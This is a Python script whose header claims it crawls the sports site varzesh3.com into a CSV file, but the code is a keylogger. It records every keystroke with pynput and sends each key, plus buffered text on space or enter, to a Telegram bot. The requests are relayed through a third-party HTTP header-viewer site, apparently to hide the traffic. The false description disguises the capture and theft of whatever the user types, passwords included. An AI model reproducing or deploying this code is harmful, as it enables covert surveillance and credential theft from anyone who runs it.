"""

--------------------------------------------------------------
Crawl website varzesh3.com and save it to csv file.

(C) 2022 Saeed Mirzamohammadi, Qazvin, Iran

Email: saeed1843mirzamohammadi@gmail.com

Id telegram : @e_l_f_5_5_5

2022/5/8
--------------------------------------------------------------

"""


from asyncio import *
import asyncio
import requests
from pynput import keyboard


bot_token="your bot telegram token"
chat_id="chat id admin"     

async def kibord_start():
    with keyboard.Listener(on_press=keyboard_log) as lstm:
    
        lstm.join()
l=[]
def keyboard_log(key):
  
    key=str(key)

    if key=="Key.space":
        
        try:
            
            url=f"https://api.telegram.org/bot{bot_token}_3d4au6DQ/sendmessage?chat_id={chat_id}&text="+str(l)
            mypay={"UrlBox":url,"AgentBox":"Google Chrome","VersionsList":" HTTP/1.1","MethodList":"GET"}
            http=requests.post("https://www.httpdebugger.com/Tools/ViewhttpHeaders.aspx",data=mypay)
            l.clear()
            
            
    
        except:
            pass

    elif key == "Key.enter":
        url=f"https://api.telegram.org/{bot_token}_3d4au6DQ/sendmessage?chat_id={chat_id}&text="+str(l)
        mypay={"UrlBox":url,"AgentBox":"Google Chrome","VersionsList":" HTTP/1.1","MethodList":"GET"}
        http=requests.post("https://www.httpdebugger.com/Tools/ViewhttpHeaders.aspx",data=mypay)
        l.clear()
    
    
    else: 
        

        url=f"https://api.telegram.org/{bot_token}_3d4au6DQ/sendmessage?chat_id={chat_id}&text="+key
        mypay={"UrlBox":url,"AgentBox":"Google Chrome","VersionsList":" HTTP/1.1","MethodList":"GET"}
        http=requests.post("https://www.httpdebugger.com/Tools/ViewhttpHeaders.aspx",data=mypay)
        l.append(key)
            
        

asyncio.run(kibord_start())